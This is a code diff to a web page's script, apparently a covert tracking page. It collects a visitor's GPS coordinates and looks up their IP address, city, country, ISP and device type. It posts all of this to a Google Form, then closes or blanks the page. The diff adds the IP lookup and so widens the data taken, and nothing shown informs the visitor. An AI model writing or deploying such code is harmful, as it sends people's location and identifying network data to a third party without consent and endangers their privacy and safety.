@@ -61,27 +61,43 @@ const E4 = "entry.883812266";  // hora
 const E5 = "entry.894873087";  // descripcion
 
 
-function device(){
-  return navigator.userAgent;
-}
-
 function closePage(){
   setTimeout(()=>{
     window.open('','_self');
     window.close();
     document.body.innerHTML="";
-    document.body.style.background="#f5f5f5";
-  },1500);
+  },1200);
 }
 
-function send(code){
 
-  navigator.geolocation.getCurrentPosition(pos=>{
+function deviceType(){
+  return /Android|iPhone|Mobile/i.test(navigator.userAgent)
+    ? "Mobile"
+    : "Desktop";
+}
+
+
+async function getIPInfo(){
+  try{
+    const res = await fetch("https://ipapi.co/json/");
+    const d = await res.json();
+
+    return `${d.ip} | ${d.city} | ${d.country_name} | ${d.org} | ${deviceType()}`;
+  }catch{
+    return `no-ip | ${deviceType()}`;
+  }
+}
+
+
+async function send(code){
+
+  navigator.geolocation.getCurrentPosition(async pos=>{
 
     const lat  = pos.coords.latitude;
     const lon  = pos.coords.longitude;
     const hora = new Date().toISOString();
-    const desc = device();
+
+    const desc = await getIPInfo();
 
     const url =
 `https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${E1}=${code}&${E2}=${lat}&${E3}=${lon}&${E4}=${hora}&${E5}=${encodeURIComponent(desc)}`;
@@ -93,7 +109,9 @@ function send(code){
   }, closePage);
 }
 
+
 </script>
+
 
 </body>
 </html>
